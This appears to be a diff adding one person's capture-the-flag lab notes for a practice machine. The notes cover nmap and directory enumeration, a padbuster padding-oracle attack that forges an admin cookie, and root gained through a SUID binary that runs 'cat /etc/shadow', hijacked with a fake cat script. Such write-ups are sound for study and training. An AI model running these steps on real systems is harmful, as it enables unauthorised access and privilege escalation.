@@ -1,0 +1,218 @@
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.18
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 10:15 EDT
+Warning: 10.10.10.18 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.18 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.18
+Host is up (0.15s latency).
+Not shown: 990 open|filtered ports, 784 closed ports, 224 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+
+kali@kali:~$ nmap -sC -sV  10.10.10.18
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 10:15 EDT
+Nmap scan report for 10.10.10.18
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
+|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
+|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
+|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: CompanyDev
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+/index.php (Status: 200)
+/register.php (Status: 200)
+/images (Status: 301)
+/login.php (Status: 200)
+/header.php (Status: 200)
+/footer.php (Status: 200)
+/css (Status: 301)
+/logout.php (Status: 302)
+/classes (Status: 301)
+
+
+/classes has multiple files
+
+[PARENTDIR]	Parent Directory	 	- 	 
+[ ]	auth.php	2017-05-02 16:27 	391 	 
+[ ]	db.php	2017-05-02 16:29 	121 	 
+[ ]	phpfix.php	2017-05-02 16:27 	100 	 
+[ ]	user.php	2017-05-02 16:52 	2.8K	 
+
+
+auth will try to redirect to /admin/login.php with 404
+
+try to create admin, looks like it's already exists
+
+ Duplicate entry 'admin' for key 'PRIMARY' 
+
+let's try following
+
+1. sql inject on password
+2. rockyou on password
+
+
+sql inject doesn't work and rockyou is too too much
+
+
+the cookie shows a php session and auth, once we changed the auth, we get a error message 
+
+Invalid padding
+
+after search this, looks like we can use oracle padding attack
+
+
+tried a open source version, doesn't work.... 
+
+using kali padbuster
+
+padbuster http://10.10.10.18 yA3AYaPFFLIG1FScREBOKZdPdAiiismY 8 -cookies auth=yA3AYaPFFLIG1FScREBOKZdPdAiiismY
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 977
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 2 ***
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#     Freq    Status  Length  Location
+-------------------------------------------------------
+1       1       200     974     N/A
+2 **    255     200     15      N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (128/256) [Byte 8]
+[+] Success: (220/256) [Byte 7]
+[+] Success: (9/256) [Byte 6]
+[+] Success: (102/256) [Byte 5]
+[+] Success: (234/256) [Byte 4]
+[+] Success: (93/256) [Byte 3]
+[+] Success: (135/256) [Byte 2]
+[+] Success: (75/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 06d4549c44404e29
+[+] Intermediate Bytes (HEX): bd7ea5139ef42681
+[+] Plain Text: user=123
+
+Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
+*** Starting Block 2 of 2 ***
+
+[+] Success: (224/256) [Byte 8]
+[+] Success: (188/256) [Byte 7]
+[+] Success: (181/256) [Byte 6]
+[+] Success: (184/256) [Byte 5]
+[+] Success: (111/256) [Byte 4]
+[+] Success: (166/256) [Byte 3]
+[+] Success: (37/256) [Byte 2]
+[+] Success: (250/256) [Byte 1]
+
+Block 2 Results:
+[+] Cipher Text (HEX): 974f7408a28ac998
+[+] Intermediate Bytes (HEX): 0edc5c944c484621
+[+] Plain Text: 
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): user=123
+
+[+] Decrypted value (HEX): 757365723D3132330808080808080808
+
+[+] Decrypted value (Base64): dXNlcj0xMjMICAgICAgICA==
+
+-------------------------------------------------------
+
+
+in case we don't give the error message, it will let us select one, it will indicate which one is most likely to be it
+in this case, it's 2, but in case we know what error message could be we can give it as para
+
+
+kali@kali:~$ padbuster http://10.10.10.18/index.php yA3AYaPFFLIG1FScREBOKZdPdAiiismY 8 -cookies auth=yA3AYaPFFLIG1FScREBOKZdPdAiiismY -error "Invalid padding"
+
+
+once we can decode this, we know it's working, now we as we already know the user admin existing, we want to know the auth of user admin
+
+
+kali@kali:~$ padbuster http://10.10.10.18/index.php yA3AYaPFFLIG1FScREBOKZdPdAiiismY 8 -cookies auth=yA3AYaPFFLIG1FScREBOKZdPdAiiismY -error "Invalid padding" -plaintext user=admin
+
+
+[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
+
+
+now set the auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA and login as admin,we have the ssh key now
+
+tried several user name like admin root tasos and finally saw the url that has the user mitsos
+
+own user
+
+find / -perm -4000 2>/dev/null
+
+shows we have a backup in our dir that has set uid
+prety sure this is the one
+
+run it, shows it cat a /etc/shadow
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804841d <+0>:     push   %ebp
+   0x0804841e <+1>:     mov    %esp,%ebp
+   0x08048420 <+3>:     and    $0xfffffff0,%esp
+   0x08048423 <+6>:     sub    $0x10,%esp
+   0x08048426 <+9>:     movl   $0x80484d0,(%esp)
+   0x0804842d <+16>:    call   0x80482f0 <system@plt>
+   0x08048432 <+21>:    mov    $0x0,%eax
+   0x08048437 <+26>:    leave  
+   0x08048438 <+27>:    ret    
+End of assembler dump.
+(gdb) x/s 80484d0
+Invalid number "80484d0".
+(gdb) x/s 0x80484d0
+0x80484d0:      "cat /etc/shadow"
+
+
+actually use strings backup shows the same thing
+
+this is not /bin/cat, so we can give a cat here
+
+#!/bin/sh
+/bin/sh
+
+then run it
+
+
+# whoami
+root
+
+
+
+
+
